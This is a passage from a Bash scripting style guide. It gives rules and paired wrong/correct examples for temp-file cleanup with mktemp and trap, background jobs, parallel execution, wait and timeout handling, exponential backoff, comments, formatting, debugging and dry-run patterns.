temp_file=$(mktemp /tmp/myapp.XXXXXX) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT

# ✗ WRONG - No cleanup trap
temp_file=$(mktemp)
echo 'data' > "$temp_file"
# Script exits, temp file remains!

# ✓ CORRECT - Always set trap
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT

# ✗ WRONG - Cleanup in script body
temp_file=$(mktemp)
echo 'data' > "$temp_file"
rm -f "$temp_file"
# If script fails before rm, file remains!

# ✓ CORRECT - Cleanup in trap
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT
echo 'data' > "$temp_file"
# Cleanup happens even if script fails

# ✗ WRONG - Creating temp file manually
temp_file="/tmp/myapp_$(date +%s).txt"
touch "$temp_file"
chmod 600 "$temp_file"
# Problems:
# - Not atomic
# - Race conditions
# - Reinventing mktemp badly

# ✓ CORRECT - Use mktemp
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT

# ✗ WRONG - Insecure permissions
temp_file=$(mktemp)
chmod 666 "$temp_file"  # World writable!
echo 'sensitive data' > "$temp_file"

# ✓ CORRECT - Keep default secure permissions
temp_file=$(mktemp) || die 1 'Failed to create temp file'
# Permissions are already 0600 (user read/write only)
echo 'sensitive data' > "$temp_file"

# ✗ WRONG - Not checking mktemp success
temp_file=$(mktemp)
echo 'data' > "$temp_file"  # May fail if mktemp failed!

# ✓ CORRECT - Check mktemp success
temp_file=$(mktemp) || die 1 'Failed to create temp file'
echo 'data' > "$temp_file"

# ✗ WRONG - Multiple traps overwrite each other
temp1=$(mktemp)
trap 'rm -f "$temp1"' EXIT

temp2=$(mktemp)
trap 'rm -f "$temp2"' EXIT  # Overwrites previous trap!
# temp1 won't be cleaned up!

# ✓ CORRECT - Single trap for all cleanup
temp1=$(mktemp) || die 1 'Failed to create temp file'
temp2=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp1" "$temp2"' EXIT

# ✓ BETTER - Cleanup function
declare -a TEMP_FILES=()
cleanup() {
  local -- file
  for file in "${TEMP_FILES[@]}"; do
    [[ -f "$file" ]] && rm -f "$file"
  done
}
trap cleanup EXIT

temp1=$(mktemp)
TEMP_FILES+=("$temp1")

temp2=$(mktemp)
TEMP_FILES+=("$temp2")

# ✗ WRONG - Using /tmp directly in script directory
temp_file="$SCRIPT_DIR"/temp.txt
# Problem: pollutes script directory

# ✓ CORRECT - Use system temp directory
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT

# ✗ WRONG - Removing temp directory without -r
temp_dir=$(mktemp -d)
trap 'rm "$temp_dir"' EXIT  # Fails if directory not empty!

# ✓ CORRECT - Use -rf for directories
temp_dir=$(mktemp -d) || die 1 'Failed to create temp directory'
trap 'rm -rf "$temp_dir"' EXIT
```

**Edge cases:**

**1. Cleanup on different exit conditions:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -- TEMP_FILE=''

cleanup() {
  local -i exit_code=$?

  if [[ -n "$TEMP_FILE" && -f "$TEMP_FILE" ]]; then
    if ((exit_code == 0)); then
      info 'Cleaning up (success)'
    else
      warn "Cleaning up (error: exit code $exit_code)"
    fi
    rm -f "$TEMP_FILE"
  fi

  return "$exit_code"
}

trap cleanup EXIT

main() {
  TEMP_FILE=$(mktemp) || die 1 'Failed to create temp file'
  readonly -- TEMP_FILE

  info "Using temp file ${TEMP_FILE@Q}"

  # Do work...

  # Cleanup happens automatically
  return 0
}

main "$@"
#fin
```

**2. Preserving temp files for debugging:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -i KEEP_TEMP=0
declare -a TEMP_FILES=()

cleanup() {
  local -i exit_code=$?
  local -- file

  if ((KEEP_TEMP)); then
    if ((${#TEMP_FILES[@]})); then
      info 'Keeping temp files for debugging:'
      for file in "${TEMP_FILES[@]}"; do
        info "  $file"
      done
    fi
  else
    for file in "${TEMP_FILES[@]}"; do
      [[ -f "$file" ]] && rm -f "$file" ||:
      [[ -d "$file" ]] && rm -rf "$file" ||:
    done
  fi

  return "$exit_code"
}

trap cleanup EXIT

main() {
  # Parse --keep-temp option
  while (($#)); do
    case $1 in
      --keep-temp) KEEP_TEMP=1 ;;
      *) break ;;
    esac
    shift
  done

  readonly -- KEEP_TEMP

  local -- temp_file
  temp_file=$(mktemp)
  TEMP_FILES+=("$temp_file")

  echo 'Debug data' > "$temp_file"

  # If --keep-temp specified, files preserved
}

main "$@"
#fin
```

**3. Temp files in specific directory:**

```bash
# Create temp file in specific directory
temp_file=$(mktemp "$SCRIPT_DIR"/temp.XXXXXX) ||
  die 1 'Failed to create temp file in script directory'

trap 'rm -f "$temp_file"' EXIT

# Create temp directory in specific location
temp_dir=$(mktemp -d "$HOME"/work/temp.XXXXXX) ||
  die 1 'Failed to create temp directory'

trap 'rm -rf "$temp_dir"' EXIT
```

**4. Multiple trap handlers:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -a TEMP_FILES=()

# Cleanup temp files
cleanup_temp() {
  local -- file
  for file in "${TEMP_FILES[@]}"; do
    [[ -f "$file" ]] && rm -f "$file" ||:
    [[ -d "$file" ]] && rm -rf "$file" ||:
  done
}

# Other cleanup
cleanup_other() {
  # Other cleanup tasks
  info 'Performing other cleanup'
}

# Combined cleanup
cleanup() {
  local -i exit_code=$?

  cleanup_temp
  cleanup_other

  return "$exit_code"
}

trap cleanup EXIT

main() {
  local -- temp_file
  temp_file=$(mktemp)
  TEMP_FILES+=("$temp_file")

  # Do work...
}

main "$@"
#fin
```

**5. Handling signals:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -- TEMP_FILE=''

cleanup() {
  local -i exit_code=$?

  if [[ -n "$TEMP_FILE" && -f "$TEMP_FILE" ]]; then
    rm -f "$TEMP_FILE"
  fi

  return "$exit_code"
}

# Cleanup on normal exit and signals
trap cleanup EXIT SIGINT SIGTERM

main() {
  TEMP_FILE=$(mktemp) || die 1 'Failed to create temp file'
  readonly -- TEMP_FILE

  info 'Press Ctrl-C to test signal handling'

  # Simulate long-running operation
  local -i i
  for ((i=1; i<=60; i+=1)); do
    echo "Working... $i"
    sleep 1
  done

  # Cleanup happens even if interrupted
}

main "$@"
#fin
```

**Summary:**

- **Always use mktemp** - never hard-code temp file paths
- **Use trap for cleanup** - ensure cleanup happens even on failure
- **Register all temp resources** - in array or cleanup function
- **EXIT trap is mandatory** - automatic cleanup when script ends
- **Check mktemp success** - `|| die` to handle creation failure
- **Default permissions are secure** - mktemp creates 0600 files, 0700 directories
- **Template support** - use custom templates for recognizable temp files
- **Keep variables readonly** - prevent accidental modification
- **Cleanup function pattern** - for multiple temp files/directories
- **--keep-temp option** - useful for debugging
- **Signal handling** - trap SIGINT SIGTERM for interruption cleanup
- **Verify security** - check permissions and ownership if handling sensitive data

**Key principle:** Temporary files are a common source of security vulnerabilities and resource leaks. Always use mktemp for creation (never hard-code paths), always use trap EXIT for cleanup (never rely on manual cleanup), and always verify that cleanup actually occurs. The combination of mktemp + trap EXIT is the gold standard for temp file handling in Bash - it's atomic, secure, and guarantees cleanup even when scripts fail or are interrupted.


---


**Rule: BCS1100**

# Concurrency & Jobs

This section covers parallel execution patterns, background job management, and robust waiting strategies for Bash 5.2+.

**5 Rules:**

1. **Background Jobs** (BCS1101) - Managing `&`, process groups, and cleanup
2. **Parallel Execution** (BCS1102) - Running tasks concurrently with output capture
3. **Wait Patterns** (BCS1103) - `wait -n`, error collection, selective waiting
4. **Timeout Handling** (BCS1104) - Using `timeout` command, exit codes 124/125
5. **Exponential Backoff** (BCS1105) - Retry patterns with increasing delays

**Key principle:** Always clean up background jobs and handle partial failures gracefully.


---


**Rule: BCS1101**

## Background Job Management

**Rule: BCS1101**

Managing background processes, job control, and process lifecycle in Bash scripts.

---

#### Rationale

Background jobs enable:
- Non-blocking execution of long-running commands
- Parallel processing for improved performance
- Responsive scripts that can handle multiple tasks
- Proper resource cleanup on script termination

---

#### Starting Background Jobs

```bash
# Basic background execution
long_running_command &
declare -i pid=$!

# Track multiple jobs
declare -a pids=()
for file in "${files[@]}"; do
  process_file "$file" &
  pids+=($!)
done
```

#### Checking Process Status

```bash
# Check if process is running (signal 0 = existence check)
if kill -0 "$pid" 2>/dev/null; then
  info "Process $pid is still running"
fi

# Get process state from /proc
if [[ -d /proc/"$pid" ]]; then
  state=$(< /proc/"$pid"/stat)
fi
```

#### Waiting for Jobs

```bash
# Wait for specific PID
wait "$pid"
exit_code=$?

# Wait for all background jobs
wait

# Wait for any job to complete (Bash 4.3+)
wait -n
```

#### Cleanup Pattern

```bash
declare -a PIDS=()

cleanup() {
  local -i exitcode=${1:-0}
  trap - SIGINT SIGTERM EXIT  # Prevent recursion

  # Kill any remaining background jobs
  for pid in "${PIDS[@]}"; do
    kill "$pid" 2>/dev/null || true
  done

  exit "$exitcode"
}
trap 'cleanup $?' SIGINT SIGTERM EXIT

# Start jobs
for task in "${tasks[@]}"; do
  run_task "$task" &
  PIDS+=($!)
done

# Wait for completion
for pid in "${PIDS[@]}"; do
  wait "$pid" || true
done
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - no PID tracking
command &
# Later cannot manage or wait for it

# ✓ Correct - always track PIDs
command &
pid=$!
```

```bash
# ✗ Wrong - using $$ in background job
command &
echo "Started $$"  # This is parent PID, not child

# ✓ Correct - use $! for last background PID
command &
echo "Started $!"
```

---

**See Also:** BCS1102 (Parallel Execution), BCS1103 (Wait Patterns), BCS1104 (Timeout Handling)

**Full implementation:** See `examples/exemplar-code/oknav/oknav` lines 475-510


---


**Rule: BCS1102**

## Parallel Execution Patterns

**Rule: BCS1102**

Executing multiple commands concurrently while maintaining control and collecting results.

---

#### Rationale

Parallel execution provides:
- Significant speedup for I/O-bound tasks
- Better resource utilization
- Responsive handling of multiple operations
- Efficient batch processing

---

#### Basic Parallel Pattern

```bash
declare -a pids=()

# Start jobs in parallel
for server in "${servers[@]}"; do
  run_command "$server" "$@" &
  pids+=($!)
done

# Wait for all to complete
for pid in "${pids[@]}"; do
  wait "$pid" || true
done
```

#### Parallel with Output Capture

```bash
declare -- temp_dir
temp_dir=$(mktemp -d)
trap 'rm -rf "$temp_dir"' EXIT

declare -a pids=()

for server in "${servers[@]}"; do
  {
    result=$(run_command "$server" 2>&1)
    echo "$result" > "$temp_dir/$server.out"
  } &
  pids+=($!)
done

# Wait then display in order
for pid in "${pids[@]}"; do
  wait "$pid" || true
done

# Output results in original order
for server in "${servers[@]}"; do
  [[ -f "$temp_dir"/"$server".out ]] && cat "$temp_dir"/"$server".out
done
```

#### Parallel with Concurrency Limit

```bash
declare -i max_jobs=4
declare -a pids=()

local -a active=()
for task in "${tasks[@]}"; do
  # Wait if at max concurrency
  while ((${#pids[@]} >= max_jobs)); do
    wait -n 2>/dev/null || true
    # Remove completed PIDs
    active=()
    for pid in "${pids[@]}"; do
      kill -0 "$pid" 2>/dev/null && active+=("$pid")
    done
    pids=("${active[@]}")
  done

  process_task "$task" &
  pids+=($!)
done

# Wait for remaining
wait
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - variable lost in subshell
count=0
for task in "${tasks[@]}"; do
  { process "$task"; count+=1; } &
done
wait
echo "$count"  # Always 0!

# ✓ Correct - use temp files for results
for task in "${tasks[@]}"; do
  { process "$task" && echo 1 >> "$temp_dir"/count; } &
done
wait
count=$(wc -l < "$temp_dir"/count)
```

---

**See Also:** BCS1101 (Background Jobs), BCS1103 (Wait Patterns)

**Full implementation:** See `examples/exemplar-code/oknav/oknav` lines 465-530


---


**Rule: BCS1103**

## Wait Patterns

**Rule: BCS1103**

Proper synchronization when waiting for background processes.

---

#### Rationale

Proper wait handling ensures:
- All resources are cleaned up
- Exit codes are captured correctly
- Scripts don't hang on failed processes
- Graceful handling of interrupted waits

---

#### Basic Wait

```bash
# Wait for specific PID and capture exit code
command &
pid=$!
wait "$pid"
exit_code=$?
```

#### Wait for All Jobs

```bash
# Wait for all background jobs
wait

# With error tracking
declare -i errors=0
for pid in "${pids[@]}"; do
  wait "$pid" || errors+=1
done
((errors)) && warn "$errors jobs failed" ||:
```

#### Wait for Any (Bash 4.3+)

```bash
# Wait for first job to complete
declare -a pids=()
for task in "${tasks[@]}"; do
  process_task "$task" &
  pids+=($!)
done

# Process as they complete
local -a active=()
while ((${#pids[@]} > 0)); do
  wait -n
  exit_code=$?
  # Handle completion...

  # Update active PIDs list
  active=()
  for pid in "${pids[@]}"; do
    kill -0 "$pid" 2>/dev/null && active+=("$pid")
  done
  pids=("${active[@]}")
done
```

#### Wait with Error Collection

```bash
declare -A exit_codes=()

for server in "${servers[@]}"; do
  run_command "$server" &
  exit_codes[$server]=$!
done

declare -i failures=0
for server in "${!exit_codes[@]}"; do
  pid=${exit_codes[$server]}
  if ! wait "$pid"; then
    exit_codes[$server]=$?
    failures+=1
  else
    exit_codes[$server]=0
  fi
done

((failures)) && error "$failures servers failed"
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - ignoring wait return value
command &
wait $!  # Exit code lost

# ✓ Correct - capture and use exit code
command &
wait $! || die 1 'Command failed'
```

---

**See Also:** BCS1101 (Background Jobs), BCS1102 (Parallel Execution)


---


**Rule: BCS1104**

## Timeout Handling

**Rule: BCS1104**

Managing command timeouts and handling timeout conditions gracefully.

---

#### Rationale

Timeout handling prevents:
- Scripts hanging on unresponsive commands
- Resource exhaustion from stuck processes
- Poor user experience with indefinite waits
- Cascading failures in automated systems

---

#### Basic Timeout

```bash
# Simple timeout (coreutils)
if timeout 30 long_running_command; then
  success 'Command completed'
else
  exit_code=$?
  if ((exit_code == 124)); then
    warn 'Command timed out'
  else
    error "Command failed with exit code $exit_code"
  fi
fi
```

#### Timeout with Signal Selection

```bash
# Send SIGTERM first, SIGKILL after grace period
timeout --signal=TERM --kill-after=10 60 command

# Common timeout exit codes:
# 124 - command timed out
# 125 - timeout command itself failed
# 126 - command found but not executable
# 127 - command not found
# 137 - killed by SIGKILL (128 + 9)
```

#### Timeout with Variable Duration

```bash
declare -i TIMEOUT=${TIMEOUT:-30}

run_with_timeout() {
  local -i timeout_sec=$1; shift

  if ! timeout "${timeout_sec}s" "$@"; then
    local -i exit_code=$?
    case $exit_code in
      124) warn "Timed out after ${timeout_sec}s" ;;
      125) error 'Timeout command failed' ;;
      *)   error "Failed with exit code $exit_code" ;;
    esac
    return "$exit_code"
  fi
}

run_with_timeout "$TIMEOUT" ssh "$server" "$command"
```

#### Read with Timeout

```bash
# User input with timeout
if read -r -t 10 -p 'Enter value: ' value; then
  info "Got: $value"
else
  warn 'Input timed out, using default'
  value='default'
fi
```

#### Connection Timeout Pattern

```bash
# SSH with connection timeout
ssh -o ConnectTimeout=10 -o BatchMode=yes "$server" "$command"

# curl with timeout
curl --connect-timeout 10 --max-time 60 "$url"
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - no timeout on network operations
ssh "$server" 'long_command'  # May hang forever

# ✓ Correct - always timeout network operations
timeout 300 ssh -o ConnectTimeout=10 "$server" 'long_command'
```

---

**See Also:** BCS1105 (Exponential Backoff)

**Full implementation:** See `examples/exemplar-code/oknav/oknav` line 676


---


**Rule: BCS1105**

## Exponential Backoff

**Rule: BCS1105**

Implementing retry logic with exponential delay for transient failures.

---

#### Rationale

Exponential backoff provides:
- Graceful handling of transient failures
- Reduced load on failing services
- Automatic recovery without manual intervention
- Configurable retry behavior

---

#### Basic Exponential Backoff

```bash
retry_with_backoff() {
  local -i max_attempts=${1:-5}
  local -i attempt=1
  shift

  while ((attempt <= max_attempts)); do
    if "$@"; then
      return 0
    fi

    local -i delay=$((2 ** attempt))
    warn "Attempt $attempt failed, retrying in ${delay}s..."
    sleep "$delay"
    attempt+=1
  done

  error "Failed after $max_attempts attempts"
  return 1
}

retry_with_backoff 5 curl -f "$url"
```

#### With Maximum Delay Cap

```bash
retry_with_backoff() {
  local -i max_attempts=5
  local -i max_delay=60
  local -i attempt=1
  local -i delay

  while ((attempt <= max_attempts)); do
    if "$@"; then
      return 0
    fi

    delay=$((2 ** attempt))
    ((delay > max_delay)) && delay=$max_delay ||:

    ((VERBOSE)) && info "Retry $attempt in ${delay}s..." ||:
    sleep "$delay"
    attempt+=1
  done

  return 1
}
```

#### With Jitter (Randomization)

```bash
# Add randomization to prevent thundering herd
retry_with_jitter() {
  local -i max_attempts=5
  local -i attempt=1

  local -i base_delay jitter delay

  while ((attempt <= max_attempts)); do
    if "$@"; then
      return 0
    fi

    base_delay=$((2 ** attempt))
    jitter=$((RANDOM % base_delay))
    delay=$((base_delay + jitter))

    sleep "$delay"
    attempt+=1
  done

  return 1
}
```

#### Claude AI Retry Pattern

From BCS compress implementation:

```bash
local -i attempt=1 max_attempts=3

while ((attempt <= max_attempts)); do
  if claude --print ... > "$temp_file" 2>&1; then
    if [[ -s "$temp_file" ]]; then
      # Success - non-empty output
      break
    fi
    warn 'Empty response, retrying...'
  fi

  sleep $((2 ** attempt))
  attempt+=1
done

((attempt > max_attempts)) && die 1 'Max retries exceeded' ||:
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - fixed delay
while ! command; do
  sleep 5  # Same delay every time
done

# ✓ Correct - exponential backoff
declare -i attempt=1
while ! command; do
  sleep $((2 ** attempt))
  attempt+=1
  ((attempt > 5)) && break ||:
done
```

```bash
# ✗ Wrong - immediate retry floods service
while ! curl "$url"; do :; done

# ✓ Correct - backoff prevents flooding
retry_with_backoff 5 curl -f "$url"
```

---

**See Also:** BCS1104 (Timeout Handling), BCS1101 (Background Jobs)

**Full implementation:** See `examples/exemplar-code/checkpoint` lines 850-870


---


**Rule: BCS1200**

# Style & Development

This section covers code formatting, documentation practices, and development patterns for maintainable Bash scripts.

**10 Rules:**

1. **Code Formatting** (BCS1201) - Indentation, line length, structure
2. **Comments** (BCS1202) - Comment style and placement
3. **Blank Lines** (BCS1203) - Whitespace for readability
4. **Section Markers** (BCS1204) - Visual section delimiters
5. **Language Practices** (BCS1205) - Bash-specific idioms
6. **Development Practices** (BCS1206) - Version control, testing habits
7. **Debugging** (BCS1207) - Debug output and tracing
8. **Dry-Run Mode** (BCS1208) - Safe preview of destructive operations
9. **Testing** (BCS1209) - Test structure and assertions
10. **Progressive State** (BCS1210) - Multi-stage operation tracking

**Key principle:** Consistent formatting and documentation make scripts maintainable by both humans and AI assistants.


---


**Rule: BCS1201**

## Code Formatting

#### Indentation
- !! Use 2 spaces for indentation (NOT tabs)
- Maintain consistent indentation throughout

#### Line Length
- Keep lines under 100 characters when practical
- Long file paths and URLs can exceed 100 chars when necessary
- Use line continuation with `\` for long commands


---


**Rule: BCS1202**

## Comments

Focus comments on explaining **WHY** (rationale, business logic, non-obvious decisions) rather than **WHAT** (which the code already shows):

```bash
# Section separator (80 dashes)
# --------------------------------------------------------------------------------

# ✓ Good - explains WHY (rationale and special cases)
# PROFILE_DIR intentionally hardcoded to /etc/profile.d for system-wide bash profile
# integration, regardless of PREFIX. This ensures builtins are available in all
# user sessions. To override, modify this line or use a custom install method.
declare -- PROFILE_DIR=/etc/profile.d

((max_depth > 0)) || max_depth=255  # -1 means unlimited (WHY -1 is special)

# If user explicitly requested --builtin, try to install dependencies
if ((BUILTIN_REQUESTED)); then
  warn 'bash-builtins package not found, attempting to install...'
fi

# ✗ Bad - restates WHAT the code already shows
# Set PROFILE_DIR to /etc/profile.d
declare -- PROFILE_DIR=/etc/profile.d

# Check if max_depth is greater than 0, otherwise set to 255
((max_depth > 0)) || max_depth=255

# If BUILTIN_REQUESTED is non-zero
if ((BUILTIN_REQUESTED)); then
  # Print warning message
  warn 'bash-builtins package not found, attempting to install...'
fi
```

**Good comment patterns:**
- Explain non-obvious business rules or edge cases
- Document intentional deviations from normal patterns
- Clarify complex logic that isn't immediately apparent
- Note why a specific approach was chosen over alternatives
- Warn about subtle gotchas or side effects

**Avoid commenting:**
- Simple variable assignments
- Obvious conditionals
- Standard patterns already documented in this style guide
- Code that is self-explanatory through good naming

**Emoticons:**
In codebase documentation, internal and external, you may use any of these icons:

     info    ◉
     debug   ⦿
     warn    ▲
     success ✓
     error   ✗ 

Avoid use of any other icon/emoticon unless it can be justified.


---


**Rule: BCS1203**

## Blank Line Usage

Use blank lines strategically to improve readability by creating visual separation between logical blocks:

```bash
#!/bin/bash
set -euo pipefail

# Script metadata
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*}
                                          # ← Blank line after metadata group

# Default values                          # ← Blank line before section comment
declare -- PREFIX=/usr/local
declare -i DRY_RUN=0
                                          # ← Blank line after variable group

# Derived paths
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
                                          # ← Blank line before function
check_prerequisites() {
  info 'Checking prerequisites...'

  # Check for gcc                         # ← Blank line after info call
  if ! command -v gcc &> /dev/null; then
    die 1 "'gcc' compiler not found."
  fi

  success 'Prerequisites check passed'    # ← Blank line between checks
}
                                          # ← Blank line between functions
main() {
  check_prerequisites
  install_files
}

main "$@"
#fin
```

**Guidelines:**
- One blank line between functions
- One blank line between logical sections within functions
- One blank line after section comments
- One blank line between groups of related variables
- Blank lines before and after multi-line conditional or loop blocks
- Avoid multiple consecutive blank lines (one is sufficient)
- No blank line needed between short, related statements


---


**Rule: BCS1204**

## Section Comments

Use lightweight section comments to organize code into logical groups. These are simpler than full 80-dash separators and provide just enough context:

```bash
# Default values
declare -- PREFIX=/usr/local
declare -i VERBOSE=1
declare -i DRY_RUN=0

# Derived paths
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
declare -- DOC_DIR="$PREFIX"/share/doc

# Core message function
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  # ...
}

# Conditional messaging functions
vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# Unconditional messaging functions
error() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

**Guidelines:**
- Use simple \`# Description\` format (no dashes, no box drawing)
- Keep section comments short and descriptive (2-4 words typically)
- Place section comment immediately before the group it describes
- Follow with a blank line after the group (before next section)
- Use for grouping related variables, functions, or logical blocks
- Reserve 80-dash separators for major script divisions only

**Common section comment patterns:**
- \`# Default values\` / \`# Configuration\`
- \`# Derived paths\` / \`# Computed variables\`
- \`# Core message function\`
- \`# Conditional messaging functions\` / \`# Unconditional messaging functions\`
- \`# Helper functions\` / \`# Utility functions\`
- \`# Business logic\` / \`# Main logic\`
- \`# Validation functions\` / \`# Installation functions\`


---


**Rule: BCS1205**

## Language Best Practices

#### Command Substitution
Always use `$()` instead of backticks for command substitution.

```bash
# ✓ Correct - modern syntax
var=$(command)
result=$(cat "$file" | grep pattern)

# ✗ Wrong - deprecated syntax
var=`command`
result=`cat "$file" | grep pattern`
```

**Rationale:**
- **Readability**: `$()` is visually clearer, especially with nested substitutions
- **Nesting**: `$()` nests naturally without escaping
- **Syntax highlighting**: Better editor support for `$()`
- **POSIX**: Both are POSIX, but `$()` is preferred in modern shells

**Nesting example:**
```bash
# ✓ Easy to read with $()
outer=$(echo "inner: $(date +%T)")

# ✗ Confusing with backticks (requires escaping)
outer=`echo "inner: \`date +%T\`"`
```

#### Builtin Commands vs External Commands
Always prefer shell builtins over external commands for performance and reliability.

```bash
# ✓ Good - bash builtins
addition=$((x + y))
string=${var^^}  # uppercase
string=${var,,}  # lowercase
if [[ -f "$file" ]]; then

# ✗ Avoid - external commands
addition=$(expr "$x" + "$y")
string=$(echo "$var" | tr '[:lower:]' '[:upper:]')
string=$(echo "$var" | tr '[:upper:]' '[:lower:]')
if [ -f "$file" ]; then
```

**Rationale:**
- **Performance**: Builtins are 10-100x faster (no process creation)
- **Reliability**: No dependency on external binaries or PATH
- **Portability**: Builtins guaranteed in bash, external commands might not be installed
- **Fewer failures**: No subshell creation, no pipe failures

**Performance comparison:**
```bash
# Builtin - instant
declare -i i result
for ((i=0; i<1000; i+=1)); do
  result=$((i * 2))
done

# External - much slower
for ((i=0; i<1000; i+=1)); do
  result=$(expr $i \* 2)  # Spawns 1000 processes!
done
```

**Common replacements:**

| External Command | Builtin Alternative | Example |
|-----------------|---------------------|---------|
| `expr` | `$(())` | `$((x + y))` instead of `$(expr $x + $y)` |
| `basename` | `${var##*/}` | `${path##*/}` instead of `$(basename "$path")` |
| `dirname` | `${var%/*}` | `${path%/*}` instead of `$(dirname "$path")` |
| `tr` (case) | `${var^^}` or `${var,,}` | `${str,,}` instead of `$(echo "$str" \| tr A-Z a-z)` |
| `test`/`[` | `[[` | `[[ -f "$file" ]]` instead of `[ -f "$file" ]` |
| `seq` | `{1..10}` or `for ((i=1; i<=10; i+=1))` | Much faster for loops |

**When external commands are necessary:**
```bash
# Some operations have no builtin equivalent
checksum=$(sha256sum "$file")
current_user=$(whoami)
sorted_data=$(sort "$file")
```


---


**Rule: BCS1206**

## Development Practices

#### ShellCheck Compliance
ShellCheck is **compulsory** for all scripts. Use `#shellcheck disable=...` only for documented exceptions.

```bash
# Document intentional violations with reason
#shellcheck disable=SC2046  # Intentional word splitting for flag expansion
set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}"

# Run shellcheck as part of development
shellcheck -x myscript.sh
```

#### Script Termination
```bash
# Always end scripts with #fin (or #end) marker
main "$@"
#fin

```

#### Defensive Programming
```bash
# Default values for critical variables
: "${VERBOSE:=0}"
: "${DEBUG:=0}"

# Validate inputs early
[[ -n "$1" ]] || die 1 'Argument required'

# Guard against unset variables
set -u
```

#### Performance Considerations
```bash
# Minimize subshells
# Use built-in string operations over external commands
# Batch operations when possible
# Use process substitution over temp files
```

#### Testing Support
```bash
# Make functions testable
# Use dependency injection for external commands
# Support verbose/debug modes
# Return meaningful exit codes
```


---


**Rule: BCS1207**

## Debugging and Development

Enable debugging features for development and troubleshooting.

```bash
# Debug mode implementation
declare -i DEBUG=${DEBUG:-0}

# Enable trace mode when DEBUG is set
((DEBUG)) && set -x ||:

# Enhanced PS4 for better trace output
export PS4='+ ${BASH_SOURCE##*/}:${LINENO}:${FUNCNAME[0]:+${FUNCNAME[0]}():} '

# Conditional debug output function
debug() {
  ((DEBUG)) || return 0
  >&2 _msg "$@"
}

# Usage
DEBUG=1 ./script.sh  # Run with debug output
```


---


**Rule: BCS1208**

## Dry-Run Pattern

Implement preview mode for operations that modify system state, allowing users to see what would happen without making actual changes.

```bash
# Declare dry-run flag
declare -i DRY_RUN=0

# Parse from command-line
-n|--dry-run) DRY_RUN=1 ;;
-N|--not-dry-run) DRY_RUN=0 ;;

# Pattern: Check flag, show preview message, return early
build_standalone() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would build standalone binaries'
    return 0
  fi

  # Actual build operations
  make standalone || die 1 'Build failed'
}

install_standalone() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would install:' \
         "  $BIN_DIR/mailheader" \
         "  $BIN_DIR/mailmessage" \
         "  $BIN_DIR/mailheaderclean"
    return 0
  fi

  # Actual installation operations
  install -m 755 build/bin/mailheader "$BIN_DIR"/
  install -m 755 build/bin/mailmessage "$BIN_DIR"/
  install -m 755 build/bin/mailheaderclean "$BIN_DIR"/
}

update_man_database() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would update man database'
    return 0
  fi

  # Actual man database update
  mandb -q 2>/dev/null || true
}
```

**Pattern structure:**
1. Check `((DRY_RUN))` at the start of functions that modify state
2. Display preview message with `[DRY-RUN]` prefix using `info`
3. Return early (exit code 0) without performing actual operations
4. Proceed with real operations only when dry-run is disabled

**Benefits:**
- Safe preview of destructive operations
- Users can verify paths, files, and commands before execution
- Useful for debugging installation scripts and system modifications
- Maintains identical control flow (same function calls, same logic paths)

**Rationale:** This pattern separates decision logic from action. The script flows through the same functions whether in dry-run mode or not, making it easy to verify logic without side effects.


---


**Rule: BCS1209**

## Testing Support Patterns

Patterns for making scripts testable.

```bash
# Dependency injection for testing
declare -f FIND_CMD >/dev/null || FIND_CMD() { find "$@"; }
declare -f DATE_CMD >/dev/null || DATE_CMD() { date "$@"; }
declare -f CURL_CMD >/dev/null || CURL_CMD() { curl "$@"; }

# In production
find_files() {
  FIND_CMD "$@"
}

# In tests, override:
FIND_CMD() { echo 'mocked_file1.txt mocked_file2.txt'; }

# Test mode flag
declare -i TEST_MODE="${TEST_MODE:-0}"

# Conditional behavior for testing
if ((TEST_MODE)); then
  # Use test data directory
